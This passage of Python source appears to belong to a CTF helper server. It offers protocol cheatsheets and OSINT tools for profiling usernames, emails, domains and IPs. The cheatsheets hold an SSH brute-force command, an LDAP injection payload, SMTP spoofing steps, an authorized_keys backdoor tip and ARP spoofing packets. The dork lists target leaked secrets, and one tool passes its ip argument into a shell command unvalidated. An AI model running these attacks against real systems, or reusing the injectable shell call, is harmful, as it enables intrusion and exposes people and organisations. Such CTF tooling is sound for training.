sendp(ARP(op=2, pdst="{target_ip}", psrc="{gateway_ip}", hwsrc=<real_gw_mac>), count=5)
sendp(ARP(op=2, pdst="{gateway_ip}", psrc="{target_ip}", hwsrc=<real_tgt_mac>), count=5)
"""


@mcp.tool()
def net_protocol_cheatsheet(protocol: str) -> str:
    """Return a quick-reference cheatsheet for a network protocol.

    Args:
        protocol: Protocol name — tcp, udp, icmp, dns, http, https, ftp, smtp,
                  ssh, tls, arp, dhcp, snmp, smb, ldap, or "list" to see all.

    Returns:
        Port numbers, packet structure, common fields, and CTF notes.
    """
    SHEETS: dict[str, str] = {
        "tcp": """=== TCP (Transmission Control Protocol) ===
Port: varies  |  IP Protocol: 6  |  Connection-oriented, reliable

Header (20–60 bytes):
  Src Port (2) | Dst Port (2) | Seq (4) | Ack (4)
  Data Offset (4b) | Reserved (3b) | Flags (9b) | Window (2)
  Checksum (2) | Urgent Ptr (2) | Options (0-40)

Flags: NS CWR ECE URG ACK PSH RST SYN FIN
  SYN         → open connection
  SYN+ACK     → server accepts
  ACK         → acknowledge data
  FIN         → graceful close
  RST         → abrupt close / port closed
  PSH         → push data to application immediately

Three-way handshake: SYN → SYN+ACK → ACK
CTF tips:
  - SYN scan (half-open): send SYN, RST after SYN+ACK → stealth port scan
  - Seq prediction attacks on old implementations
  - TCP session hijacking via seq/ack injection
  - Out-of-order segments can bypass IDS (overlapping offsets)""",

        "udp": """=== UDP (User Datagram Protocol) ===
Port: varies  |  IP Protocol: 17  |  Connectionless, unreliable

Header (8 bytes):
  Src Port (2) | Dst Port (2) | Length (2) | Checksum (2)

CTF tips:
  - DNS (53), DHCP (67/68), SNMP (161), TFTP (69) all use UDP
  - No handshake — packets can be spoofed easily (src IP forgeable)
  - UDP flood DDoS: amplification via DNS/NTP/SSDP reflection
  - Checksum is optional in IPv4 (can be 0x0000)""",

        "icmp": """=== ICMP (Internet Control Message Protocol) ===
IP Protocol: 1  |  No ports

Header: Type (1) | Code (1) | Checksum (2) | Rest (4)

Common Types:
  0  Echo Reply      (code 0)
  3  Dest Unreachable (codes 0-15: net/host/port unreachable etc.)
  8  Echo Request    (ping)
  11 Time Exceeded   (TTL=0, used by traceroute)
  12 Parameter Problem
  30 Traceroute

CTF tips:
  - ICMP tunnel: hide data in echo payload (icmpsh, ptunnel)
  - Type 3 code 3 = port closed (vs no response = filtered)
  - Ping of Death: oversized ICMP fragment reassembly""",

        "dns": """=== DNS (Domain Name System) ===
Port: 53 UDP (queries) / 53 TCP (zone transfers, large responses)

Packet structure:
  Transaction ID (2) | Flags (2) | QDCOUNT (2) | ANCOUNT (2)
  NSCOUNT (2) | ARCOUNT (2) | Questions | Answers | Authority | Additional

Record Types: A AAAA MX NS TXT CNAME SOA PTR SRV NAPTR

Flags:
  QR (1b): 0=query 1=response
  Opcode (4b): 0=standard
  AA: Authoritative Answer
  TC: Truncated
  RD: Recursion Desired
  RA: Recursion Available
  RCODE: 0=OK 1=format 2=servfail 3=NXDOMAIN

CTF tips:
  - DNS exfil: base64 data in subdomain labels, read with tshark
  - Zone transfer: dig axfr @<ns> <domain>
  - DNS rebinding: control DNS TTL to bypass same-origin
  - DNS cache poisoning: Kaminsky attack (birthday + source port)
  - TXT records often hide flags or hints""",

        "http": """=== HTTP (HyperText Transfer Protocol) ===
Port: 80 TCP  |  Text-based, stateless

Request: METHOD /path HTTP/1.1\\r\\nHeaders\\r\\n\\r\\nBody
Response: HTTP/1.1 STATUS Reason\\r\\nHeaders\\r\\n\\r\\nBody

Methods: GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT
Status codes: 1xx info | 2xx success | 3xx redirect | 4xx client | 5xx server

Key headers:
  Host, User-Agent, Cookie, Authorization, Content-Type, Content-Length
  Set-Cookie, Location, Server, X-Forwarded-For, Referer

CTF tips:
  - Check all HTTP methods (TRACE, OPTIONS, PUT)
  - Robots.txt, .git/, .env, backup files
  - HTTP request smuggling: CL+TE or TE+CL desync
  - CRLF injection in headers
  - HTTP/2 vs HTTP/1.1 parsing differences""",

        "ftp": """=== FTP (File Transfer Protocol) ===
Port: 21 TCP (control), 20 TCP (data, active mode)
Passive mode: server picks ephemeral data port

Commands: USER PASS LIST RETR STOR PWD CWD MKD RMD QUIT PASV PORT
Responses: 1xx=positive preliminary | 2xx=positive completion |
           3xx=positive intermediate | 4xx/5xx=error

CTF tips:
  - Anonymous login: USER anonymous, PASS anything
  - Clear-text protocol — sniff credentials in PCAP
  - Bounce attack: PORT to internal host (pivot)
  - RETR/STOR with directory traversal in old servers
  - FTP over TLS: FTPS (implicit 990, explicit AUTH TLS on 21)""",

        "smtp": """=== SMTP (Simple Mail Transfer Protocol) ===
Port: 25 TCP (server-to-server), 587 (submission), 465 (SMTPS)

Commands: HELO/EHLO MAIL FROM RCPT TO DATA QUIT STARTTLS AUTH VRFY EXPN

CTF tips:
  - VRFY/EXPN for user enumeration (often disabled)
  - Open relay: relay mail through misconfigured server
  - Header injection: inject Bcc via newline in form field
  - Email spoofing: forged From header if SPF/DKIM/DMARC missing
  - Credentials in cleartext AUTH LOGIN or AUTH PLAIN
  telnet <host> 25
  EHLO attacker.com
  MAIL FROM:<fake@example.com>
  RCPT TO:<victim@target.com>
  DATA
  Subject: test\\n\\nBody.
  .""",

        "ssh": """=== SSH (Secure Shell) ===
Port: 22 TCP  |  Encrypted, authenticated

Key exchange: DH or ECDH, then AES/ChaCha20 + HMAC
Auth methods: password, publickey, keyboard-interactive, GSSAPI

CTF tips:
  - Default/weak passwords: hydra -l root -P rockyou.txt ssh://host
  - Old key formats (RSA512, DSA) — may be crackable
  - Weak random seed → predictable RSA/ECDSA keys (Debian OpenSSL 2008)
  - SSH tunnels: ssh -L local:remotehost:port user@hop (local forward)
                 ssh -R remoteport:localhost:localport user@server (reverse)
                 ssh -D 1080 user@server (SOCKS proxy)
  - Authorized_keys backdoor: add your pubkey
  - UserKnownHostsFile=/dev/null StrictHostKeyChecking=no (bypass host check)""",

        "tls": """=== TLS (Transport Layer Security) ===
Port: depends on application (443 HTTPS, 993 IMAPS, 636 LDAPS …)

Handshake (TLS 1.2):
  1. ClientHello (ciphers, random)
  2. ServerHello (chosen cipher, random) + Certificate + ServerHelloDone
  3. ClientKeyExchange (encrypted pre-master secret)
  4. ChangeCipherSpec + Finished (both sides)

Handshake (TLS 1.3):
  1. ClientHello (key_share, ciphers)
  2. ServerHello (key_share) + EncryptedExtensions + Certificate + Finished
  3. Client Finished

CTF tips:
  - Downgrade to SSLv2/3 or TLS 1.0: POODLE, BEAST, DROWN
  - CRIME/BREACH: compression oracle on TLS stream
  - ROBOT attack: RSA PKCS#1 v1.5 padding oracle
  - Weak ciphers: RC4, DES, export ciphers (FREAK, LOGJAM)
  - Invalid cert checks: self-signed, expired, wrong CN/SAN
  - Certificate Transparency logs: crt.sh for subdomain enum""",

        "arp": """=== ARP (Address Resolution Protocol) ===
EtherType: 0x0806  |  LAN only (not routed)

Packet: HW type (2) | Proto type (2) | HW len (1) | Proto len (1)
        Operation (2) | Sender HW addr | Sender proto addr
        Target HW addr | Target proto addr

Operation: 1=Request ("who has X.X.X.X?"), 2=Reply ("X.X.X.X is at AA:BB:CC")

CTF tips:
  - Gratuitous ARP: op=2 with sender=target → update caches (spoof)
  - ARP cache poisoning: see net_arp_spoof_explain tool
  - Detect in PCAP: duplicate IP with different MACs
  - No authentication — trivially spoofed on LAN
  - arp -n to view local ARP table""",

        "dhcp": """=== DHCP (Dynamic Host Configuration Protocol) ===
Port: 67/68 UDP  |  Broadcast-based

DORA handshake:
  1. DISCOVER (client broadcast, src 0.0.0.0 → 255.255.255.255)
  2. OFFER    (server → client, proposed IP + options)
  3. REQUEST  (client broadcast, requesting offered IP)
  4. ACK      (server confirms, sends lease)

Options: 1=subnet mask, 3=router, 6=DNS, 51=lease time, 53=DHCP msg type

CTF tips:
  - DHCP starvation: exhaust pool with spoofed MACs → DoS
  - Rogue DHCP server: win race with OFFER, set attacker as DNS/gateway
  - DHCP option 82: relay agent info, can carry metadata
  - Credentials/flags sometimes in option 43 (vendor specific)""",

        "snmp": """=== SNMP (Simple Network Management Protocol) ===
Port: 161 UDP (agent), 162 UDP (trap receiver)
Versions: v1, v2c (community string), v3 (auth+priv)

Operations: GET, GETNEXT, GETBULK, SET, TRAP, INFORM

Community strings: "public" (read), "private" (write) — default/guessable

CTF tips:
  - snmpwalk -v2c -c public <host> .1 → dump whole MIB tree
  - Common MIBs: sysDescr (.1.3.6.1.2.1.1.1), sysName, ifDescr
  - Brute community: onesixtyone <host> -c /usr/share/doc/onesixtyone/dict.txt
  - SNMP SET can change config on routers/switches
  - v1/v2c community string sent in cleartext""",

        "smb": """=== SMB (Server Message Block) ===
Port: 445 TCP (direct), 139 TCP (NetBIOS)

CTF tips:
  - Null session: smbclient //host/share -N (no password)
  - List shares: smbclient -L //host -N
  - Guest access: smbclient //host/share -U guest%
  - EternalBlue (MS17-010): RCE via SMBv1 buffer overflow
  - PrintNightmare (CVE-2021-1675/34527): PrintSpooler RCE
  - Pass-the-Hash: authenticate with NTLM hash instead of password
  - Enum: enum4linux -a host | crackmapexec smb host
  - SMB relay: NTLM relay from one host to another
  - Check SYSVOL/NETLOGON for GPO passwords""",

        "ldap": """=== LDAP (Lightweight Directory Access Protocol) ===
Port: 389 TCP (cleartext), 636 TCP (LDAPS), 3268/3269 (Global Catalog)

Operations: Bind, Search, Add, Delete, Modify, Compare, Abandon

DN format: cn=user,ou=Users,dc=example,dc=com
Filter syntax: (&(objectClass=user)(sAMAccountName=admin))

CTF tips:
  - Anonymous bind: ldapsearch -x -H ldap://host -b "dc=example,dc=com"
  - Dump AD: ldapsearch -x -H ldap://dc -D user@dom -w pass -b "dc=dom,dc=com"
  - LDAP injection: *)(uid=*))(|(uid=* in username field
  - BloodHound: neo4j + SharpHound for AD attack path analysis
  - Password in description field (common misconfiguration)
  - ASREPRoasting: accounts with "do not require Kerberos pre-auth"
  - Kerberoasting: request TGS for SPNs, crack offline""",
    }

    key = protocol.lower().strip()
    if key == "list":
        return "Available protocols:\n  " + "  ".join(sorted(SHEETS.keys()))
    if key not in SHEETS:
        available = ", ".join(sorted(SHEETS.keys()))
        return f"Unknown protocol '{protocol}'. Available: {available}\nUse 'list' to see all."
    return SHEETS[key]


# ===========================================================================
# OSINT TOOLBOX
# ===========================================================================

@mcp.tool()
def osint_username_search(username: str) -> str:
    """Search for a username across popular platforms and return profile URL candidates.

    Args:
        username: The username / handle to search for.

    Returns:
        List of candidate profile URLs with HTTP status for each platform checked.
    """
    import warnings
    try:
        import requests
    except ImportError:
        return "requests library not available."

    warnings.filterwarnings("ignore")

    PLATFORMS = {
        "GitHub": "https://github.com/{u}",
        "GitLab": "https://gitlab.com/{u}",
        "Twitter/X": "https://twitter.com/{u}",
        "Instagram": "https://www.instagram.com/{u}/",
        "Reddit": "https://www.reddit.com/user/{u}",
        "LinkedIn": "https://www.linkedin.com/in/{u}",
        "TikTok": "https://www.tiktok.com/@{u}",
        "YouTube": "https://www.youtube.com/@{u}",
        "Pinterest": "https://www.pinterest.com/{u}",
        "Tumblr": "https://www.tumblr.com/{u}",
        "Medium": "https://medium.com/@{u}",
        "Dev.to": "https://dev.to/{u}",
        "HackerNews": "https://news.ycombinator.com/user?id={u}",
        "Stack Overflow": "https://stackoverflow.com/users/{u}",
        "Pastebin": "https://pastebin.com/u/{u}",
        "Keybase": "https://keybase.io/{u}",
        "Steam": "https://steamcommunity.com/id/{u}",
        "Twitch": "https://www.twitch.tv/{u}",
        "Spotify": "https://open.spotify.com/user/{u}",
        "Gravatar": "https://www.gravatar.com/{u}",
        "DockerHub": "https://hub.docker.com/u/{u}",
        "npm": "https://www.npmjs.com/~{u}",
        "PyPI": "https://pypi.org/user/{u}/",
        "HackTheBox": "https://app.hackthebox.com/profile/{u}",
        "TryHackMe": "https://tryhackme.com/p/{u}",
        "Replit": "https://replit.com/@{u}",
        "Gitlab Pages": "https://{u}.gitlab.io",
        "GitHub Pages": "https://{u}.github.io",
    }

    found = []
    not_found = []
    errors = []

    headers = {"User-Agent": "Mozilla/5.0 (CTF-OSINT-Scanner)"}

    for platform, url_tpl in PLATFORMS.items():
        url = url_tpl.replace("{u}", username)
        try:
            r = requests.get(url, headers=headers, timeout=6, verify=False, allow_redirects=True)
            if r.status_code in (200, 301, 302):
                found.append(f"  [{r.status_code}] {platform:<20} {url}")
            elif r.status_code == 404:
                not_found.append(f"  [404] {platform:<20} {url}")
            else:
                errors.append(f"  [{r.status_code}] {platform:<20} {url}")
        except Exception as exc:
            errors.append(f"  [ERR] {platform:<20} {str(exc)[:60]}")

    lines = [f"=== Username OSINT: {username} ===",
             f"Platforms checked: {len(PLATFORMS)}",
             f"Possible matches : {len(found)}",
             ""]
    if found:
        lines.append("--- FOUND / Reachable ---")
        lines.extend(found)
    if errors:
        lines.append("\n--- Errors ---")
        lines.extend(errors[:10])
    return "\n".join(lines)


@mcp.tool()
def osint_email_investigate(email: str) -> str:
    """Investigate an email address — format check, domain MX/SPF/DMARC, breaches, Gravatar.

    Args:
        email: Email address to investigate.

    Returns:
        Format validity, domain DNS records, breach indicators, Gravatar hash.
    """
    import warnings
    try:
        import requests
    except ImportError:
        return "requests library not available."

    warnings.filterwarnings("ignore")

    lines = [f"=== Email Investigation: {email} ===\n"]

    # Basic format check
    match = re.match(r"^([^@]+)@([\w.\-]+)$", email)
    if not match:
        return f"Invalid email format: {email}"
    local, domain = match.group(1), match.group(2)
    lines.append(f"Local part : {local}")
    lines.append(f"Domain     : {domain}\n")

    # MX records
    mx = _run(["dig", "+short", "MX", domain], timeout=8)
    lines.append(f"--- MX Records ---\n{mx.strip() or '(none)'}\n")

    # SPF record
    spf = _run(["dig", "+short", "TXT", domain], timeout=8)
    spf_records = [l for l in spf.splitlines() if "v=spf1" in l.lower()]
    lines.append(f"--- SPF ---\n{chr(10).join(spf_records) or '(no SPF record — email spoofing possible)'}\n")

    # DMARC
    dmarc = _run(["dig", "+short", "TXT", f"_dmarc.{domain}"], timeout=8)
    lines.append(f"--- DMARC ---\n{dmarc.strip() or '(no DMARC record)'}\n")

    # DKIM (common selector)
    for selector in ("default", "google", "mail", "k1"):
        dkim = _run(["dig", "+short", "TXT", f"{selector}._domainkey.{domain}"], timeout=5)
        if dkim.strip():
            lines.append(f"--- DKIM ({selector}) ---\n{dkim.strip()}\n")
            break

    # Gravatar MD5 hash
    gravatar_hash = hashlib.md5(email.strip().lower().encode()).hexdigest()
    lines.append(f"--- Gravatar ---")
    lines.append(f"  Hash : {gravatar_hash}")
    lines.append(f"  URL  : https://www.gravatar.com/avatar/{gravatar_hash}?d=404")
    lines.append(f"  Profile: https://www.gravatar.com/{gravatar_hash}\n")

    # HaveIBeenPwned hint (API requires key, give manual guidance)
    lines.append("--- Breach Check (HaveIBeenPwned) ---")
    lines.append(f"  Manual: https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
    lines.append(f"  API   : GET https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}")
    lines.append(f"          Header: hibp-api-key: <your_key>\n")

    # Disposable domain check (common throwaway domains)
    DISPOSABLE = {"mailinator.com", "guerrillamail.com", "10minutemail.com",
                  "tempmail.com", "throwam.com", "yopmail.com", "sharklasers.com",
                  "guerrillamailblock.com", "grr.la", "guerrillamail.info",
                  "spam4.me", "trashmail.com", "dispostable.com", "maildrop.cc"}
    if domain.lower() in DISPOSABLE:
        lines.append(f"⚠ DISPOSABLE email domain detected: {domain}")

    return "\n".join(lines)


@mcp.tool()
def osint_domain_recon(domain: str) -> str:
    """Comprehensive domain reconnaissance — WHOIS, DNS, subdomains, headers, tech stack.

    Args:
        domain: Target domain (e.g. example.com).

    Returns:
        WHOIS registrar/dates, all DNS records, common subdomain probes, HTTP headers.
    """
    import warnings
    try:
        import requests
    except ImportError:
        requests = None  # type: ignore

    warnings.filterwarnings("ignore")
    lines = [f"=== Domain Recon: {domain} ===\n"]

    # WHOIS (truncated)
    whois_out = _run(["whois", domain], timeout=20)
    important = []
    for line in whois_out.splitlines():
        low = line.lower()
        if any(k in low for k in ("registrar", "creation", "expir", "updated",
                                   "name server", "registrant", "status", "dnssec")):
            important.append("  " + line.strip())
    lines.append("--- WHOIS Summary ---")
    lines.extend(important[:30] or ["  (no data)"])
    lines.append("")

    # DNS records
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"):
        out = _run(["dig", "+short", rtype, domain], timeout=8)
        if out.strip():
            lines.append(f"--- {rtype} ---")
            lines.append(out.strip())
            lines.append("")

    # Certificate Transparency — subdomains via crt.sh
    lines.append("--- Subdomains (crt.sh certificate transparency) ---")
    if requests:
        try:
            r = requests.get(
                f"https://crt.sh/?q=%.{domain}&output=json",
                timeout=10, verify=False,
                headers={"User-Agent": "Mozilla/5.0 (CTF-OSINT)"}
            )
            if r.status_code == 200:
                entries = r.json()
                subs = sorted({e.get("name_value", "").lower()
                               for e in entries
                               if domain in e.get("name_value", "")})
                for s in subs[:60]:
                    lines.append(f"  {s}")
                if len(subs) > 60:
                    lines.append(f"  ... and {len(subs)-60} more")
                if not subs:
                    lines.append("  (none found)")
            else:
                lines.append(f"  crt.sh returned {r.status_code}")
        except Exception as exc:
            lines.append(f"  crt.sh error: {exc}")
    else:
        lines.append("  (requests not available)")
    lines.append("")

    # Common subdomain probe
    COMMON_SUBS = ["www", "mail", "ftp", "vpn", "admin", "api", "dev",
                   "staging", "test", "beta", "portal", "login", "app",
                   "blog", "shop", "cdn", "static", "git", "jira", "confluence"]
    lines.append("--- Common Subdomain Probe (A record) ---")
    for sub in COMMON_SUBS:
        fqdn = f"{sub}.{domain}"
        a = _run(["dig", "+short", "A", fqdn], timeout=4)
        if a.strip():
            lines.append(f"  {fqdn:<35} {a.strip().splitlines()[0]}")

    # HTTP headers of main domain
    if requests:
        lines.append("\n--- HTTP Headers (https) ---")
        try:
            r = requests.get(f"https://{domain}", timeout=8, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 (CTF-OSINT)"},
                             allow_redirects=True)
            for k, v in r.headers.items():
                lines.append(f"  {k}: {v}")
            # Tech fingerprint
            server = r.headers.get("Server", "")
            powered = r.headers.get("X-Powered-By", "")
            if server or powered:
                lines.append(f"\n  Tech: Server={server}  X-Powered-By={powered}")
        except Exception as exc:
            lines.append(f"  {exc}")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def osint_ip_investigate(ip: str) -> str:
    """Investigate an IP address — geolocation, ASN, reverse DNS, open ports hint, abuse.

    Args:
        ip: IPv4 or IPv6 address to investigate.

    Returns:
        Geolocation, ISP/ASN, PTR record, SHODAN-style hints, and abuse DB links.
    """
    import warnings
    try:
        import requests
    except ImportError:
        return "requests library not available."

    warnings.filterwarnings("ignore")
    lines = [f"=== IP Investigation: {ip} ===\n"]

    # Reverse DNS
    ptr = _run(["dig", "+short", "-x", ip], timeout=6)
    lines.append(f"PTR (rDNS) : {ptr.strip() or '(none)'}")

    # ip-api.com free geolocation
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,"
            f"city,zip,lat,lon,timezone,isp,org,as,query",
            timeout=8
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                lines.append(f"Country    : {data.get('country', '?')}")
                lines.append(f"Region     : {data.get('regionName', '?')}")
                lines.append(f"City       : {data.get('city', '?')}")
                lines.append(f"ZIP        : {data.get('zip', '?')}")
                lines.append(f"Lat/Lon    : {data.get('lat', '?')}, {data.get('lon', '?')}")
                lines.append(f"Timezone   : {data.get('timezone', '?')}")
                lines.append(f"ISP        : {data.get('isp', '?')}")
                lines.append(f"Org        : {data.get('org', '?')}")
                lines.append(f"ASN        : {data.get('as', '?')}")
            else:
                lines.append(f"ip-api: {data.get('message', 'unknown error')}")
    except Exception as exc:
        lines.append(f"Geolocation error: {exc}")

    lines.append("")

    # BGP / ASN info via Team Cymru whois
    cymru = _run(
        f"whois -h whois.cymru.com \" -v {ip}\"",
        timeout=10, shell=True
    )
    if cymru.strip():
        lines.append("--- ASN (Team Cymru) ---")
        lines.append(cymru.strip())
        lines.append("")

    # Shodan / AbuseIPDB links
    lines.append("--- External Lookup Links ---")
    lines.append(f"  Shodan      : https://www.shodan.io/host/{ip}")
    lines.append(f"  AbuseIPDB   : https://www.abuseipdb.com/check/{ip}")
    lines.append(f"  VirusTotal  : https://www.virustotal.com/gui/ip-address/{ip}")
    lines.append(f"  Censys      : https://search.censys.io/hosts/{ip}")
    lines.append(f"  GreyNoise   : https://www.greynoise.io/viz/ip/{ip}")
    lines.append(f"  IPInfo      : https://ipinfo.io/{ip}")
    lines.append(f"  BGPView     : https://bgpview.io/ip/{ip}")

    # Check if private/special range
    import ipaddress
    try:
        addr = ipaddress.ip_address(ip)
        tags = []
        if addr.is_private:
            tags.append("PRIVATE")
        if addr.is_loopback:
            tags.append("LOOPBACK")
        if addr.is_multicast:
            tags.append("MULTICAST")
        if addr.is_reserved:
            tags.append("RESERVED")
        if tags:
            lines.append(f"\n⚠ Special address: {', '.join(tags)}")
    except ValueError:
        lines.append(f"\nInvalid IP address format: {ip}")

    return "\n".join(lines)


@mcp.tool()
def osint_google_dorks(target: str, dork_type: str = "all") -> str:
    """Generate Google dork queries for a target domain or keyword.

    Args:
        target: Domain, company name, or keyword to build dorks around.
        dork_type: Category — files, login, config, sensitive, employees, tech, subdomains,
                   pastebin, git, cameras, or "all" for everything.

    Returns:
        Ready-to-paste Google dork queries with descriptions.
    """
    t = target

    DORKS: dict[str, list[tuple[str, str]]] = {
        "files": [
            (f'site:{t} ext:pdf', "PDF documents"),
            (f'site:{t} ext:doc OR ext:docx', "Word documents"),
            (f'site:{t} ext:xls OR ext:xlsx', "Excel spreadsheets"),
            (f'site:{t} ext:ppt OR ext:pptx', "PowerPoint files"),
            (f'site:{t} ext:txt', "Text files"),
            (f'site:{t} ext:csv', "CSV data files"),
            (f'site:{t} ext:sql', "SQL dumps"),
            (f'site:{t} ext:bak OR ext:backup OR ext:old', "Backup files"),
            (f'site:{t} ext:log', "Log files"),
            (f'site:{t} ext:json', "JSON files"),
            (f'site:{t} ext:xml', "XML files"),
            (f'site:{t} ext:yaml OR ext:yml', "YAML config files"),
        ],
        "login": [
            (f'site:{t} inurl:login', "Login pages"),
            (f'site:{t} inurl:admin', "Admin panels"),
            (f'site:{t} inurl:dashboard', "Dashboards"),
            (f'site:{t} inurl:portal', "Portals"),
            (f'site:{t} inurl:wp-login', "WordPress login"),
            (f'site:{t} inurl:phpmyadmin', "phpMyAdmin"),
            (f'site:{t} inurl:cpanel', "cPanel"),
            (f'site:{t} inurl:webmail', "Webmail"),
            (f'site:{t} intitle:"sign in"', "Sign-in pages"),
        ],
        "config": [
            (f'site:{t} ext:env', ".env files (credentials!)"),
            (f'site:{t} inurl:.git', "Git directory exposed"),
            (f'site:{t} ext:conf OR ext:config', "Config files"),
            (f'site:{t} inurl:wp-config', "WordPress config"),
            (f'site:{t} inurl:config.php', "PHP config"),
            (f'site:{t} intitle:"index of" ".env"', ".env in directory listings"),
            (f'site:{t} intitle:"index of" "config"', "Config in directory listings"),
            (f'site:{t} inurl:dockerfile OR inurl:docker-compose', "Docker files"),
            (f'site:{t} ext:ini', "INI config files"),
        ],
        "sensitive": [
            (f'site:{t} intitle:"index of"', "Open directory listings"),
            (f'site:{t} "password" ext:txt OR ext:log', "Passwords in text/log files"),
            (f'site:{t} "api_key" OR "apikey" OR "api key"', "API keys"),
            (f'site:{t} "secret" OR "token" ext:json OR ext:yaml', "Secrets in config"),
            (f'site:{t} "BEGIN RSA PRIVATE KEY" OR "BEGIN PRIVATE KEY"', "Private keys"),
            (f'site:{t} filetype:sql "INSERT INTO" "password"', "SQL with passwords"),
            (f'site:{t} inurl:backup', "Backup directories"),
            (f'site:{t} inurl:error OR inurl:debug', "Error/debug pages"),
        ],
        "employees": [
            (f'site:linkedin.com "{t}" employees', "LinkedIn employees"),
            (f'site:linkedin.com/in "{t}"', "LinkedIn profiles mentioning target"),
            (f'"@{t}" email contact', "Email addresses"),
            (f'site:{t} "mailto:" filetype:html', "Mailto links"),
            (f'site:{t} intext:"@{t}"', "Internal email references"),
        ],
        "tech": [
            (f'site:{t} "powered by"', "Technology disclosures"),
            (f'site:{t} "php version" OR "server version"', "Version disclosure"),
            (f'site:{t} intitle:"apache" OR intitle:"nginx"', "Web server info pages"),
            (f'site:{t} inurl:jira OR inurl:confluence', "Atlassian tools"),
            (f'site:{t} inurl:jenkins', "Jenkins CI"),
            (f'site:{t} inurl:gitlab', "GitLab instance"),
            (f'site:{t} inurl:grafana', "Grafana dashboard"),
            (f'site:{t} inurl:kibana', "Kibana dashboard"),
        ],
        "subdomains": [
            (f'site:*.{t}', "All indexed subdomains"),
            (f'site:*.{t} -www', "Subdomains (excl. www)"),
            (f'site:pastebin.com "{t}"', "Pastebin mentions"),
            (f'site:github.com "{t}"', "GitHub code mentions"),
            (f'site:gitlab.com "{t}"', "GitLab code mentions"),
        ],
        "pastebin": [
            (f'site:pastebin.com "{t}"', "Pastebin pastes mentioning target"),
            (f'site:paste.org "{t}"', "paste.org"),
            (f'site:hastebin.com "{t}"', "Hastebin"),
            (f'site:pastie.org "{t}"', "Pastie"),
            (f'site:dpaste.org "{t}"', "dpaste"),
        ],
        "git": [
            (f'site:github.com "{t}" password OR secret OR key', "GitHub secrets"),
            (f'site:gitlab.com "{t}" password OR secret OR key', "GitLab secrets"),
            (f'"{t}" extension:env OR extension:yaml language:yaml', "GitHub config files"),
            (f'site:github.com "{t}" "config.json"', "GitHub config.json"),
        ],
        "cameras": [
            (f'site:{t} inurl:view/index.shtml', "Axis cameras"),
            (f'site:{t} intitle:"webcamXP"', "WebcamXP"),
            (f'site:{t} inurl:"/mjpg/video.mjpg"', "MJPEG streams"),
        ],
    }

    selected: dict[str, list[tuple[str, str]]] = {}
    if dork_type == "all":
        selected = DORKS
    elif dork_type in DORKS:
        selected = {dork_type: DORKS[dork_type]}
    else:
        avail = ", ".join(sorted(DORKS.keys()))
        return f"Unknown dork_type '{dork_type}'. Available: all, {avail}"

    lines = [f"=== Google Dorks: {target} ===",
             f"Categories: {', '.join(selected.keys())}", ""]

    for category, dorks in selected.items():
        lines.append(f"--- {category.upper()} ---")
        for query, desc in dorks:
            lines.append(f"  # {desc}")
            lines.append(f"  {query}")
            lines.append("")
        lines.append("")

    lines.append("=== How to Use ===")
    lines.append("  1. Paste query into Google search bar")
    lines.append("  2. Use site:google.com/advanced_search for guided UI")
    lines.append("  3. Automate with SerpAPI, Startpage, or Bing API")
    lines.append("  4. More dorks: https://www.exploit-db.com/google-hacking-database")

    return "\n".join(lines)


@mcp.tool()
def osint_metadata_extract(path: str) -> str:
    """Extract EXIF and metadata from a file in the workspace.

    Supports images (JPEG, PNG, TIFF), PDFs, Office docs, audio, video.

    Args:
        path: Path to the file (relative to workspace).

    Returns:
        All metadata fields extracted by ExifTool, including GPS, author, timestamps.
    """
    safe = _safe_path(path)
    out = _run(["exiftool", "-a", "-u", "-g1", str(safe)], timeout=20)
    if not out.strip():
        return f"No metadata extracted from {path} (or file not found)."

    # Flag interesting fields
    interesting = []
    for line in out.splitlines():
        low = line.lower()
        if any(k in low for k in ("gps", "author", "creator", "email", "phone",
                                   "software", "serial", "producer", "company",
                                   "comment", "description", "latitude", "longitude",
                                   "create date", "modify date", "owner")):
            interesting.append("  ★ " + line.strip())

    result = f"=== Metadata: {path} ===\n\n" + out.strip()
    if interesting:
        result += "\n\n=== Interesting Fields ===\n" + "\n".join(interesting)
    return _truncate(result, 8192)


@mcp.tool()
def osint_image_reverse_search(path: str) -> str:
    """Compute image hashes and generate reverse image search URLs.

    Args:
        path: Path to image file (relative to workspace).

    Returns:
        MD5/SHA256/perceptual hash of image, direct search links for Google/Yandex/TinEye/Bing.
    """
    safe = _safe_path(path)

    # File hashes
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    md5 = hashlib.md5(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()

    # Perceptual hash via Python (simple average hash)
    phash_str = "(install Pillow for perceptual hash: pip install Pillow)"
    try:
        from PIL import Image  # type: ignore
        import io
        img = Image.open(io.BytesIO(data)).convert("L").resize((8, 8), Image.LANCZOS)
        pixels = list(img.getdata())
        avg = sum(pixels) / len(pixels)
        bits = "".join("1" if p >= avg else "0" for p in pixels)
        phash_int = int(bits, 2)
        phash_str = f"{phash_int:016x}"
    except ImportError:
        pass
    except Exception as exc:
        phash_str = f"error: {exc}"

    # Exif GPS for geo-context
    gps_out = _run(["exiftool", "-GPS*", "-c", "%.6f", str(safe)], timeout=10)

    lines = [f"=== Reverse Image Search: {path} ===",
             f"MD5    : {md5}",
             f"SHA256 : {sha256}",
             f"pHash  : {phash_str}",
             ""]

    if gps_out.strip():
        lines.append("--- GPS Metadata ---")
        lines.append(gps_out.strip())
        lines.append("")

    lines.append("--- Reverse Image Search Links ---")
    lines.append("  Upload the image directly to each service:")
    lines.append("  Google Images : https://images.google.com/  (click camera icon)")
    lines.append("  Yandex Images : https://yandex.com/images/  (drag and drop)")
    lines.append("  TinEye        : https://tineye.com/")
    lines.append("  Bing Visual   : https://www.bing.com/visualsearch")
    lines.append("  CTFR          : https://ctfr.space/  (CTF image OSINT)")
    lines.append("")
    lines.append("--- SHA256 Lookups ---")
    lines.append(f"  VirusTotal: https://www.virustotal.com/gui/file/{sha256}")

    return "\n".join(lines)


@mcp.tool()
def osint_social_media_analysis(text: str) -> str:
    """Analyze text (post/bio/profile) for OSINT indicators.

    Extracts usernames, emails, phone numbers, locations, URLs, hashtags,
    handles, dates, and potential identifiers from freeform social media text.

    Args:
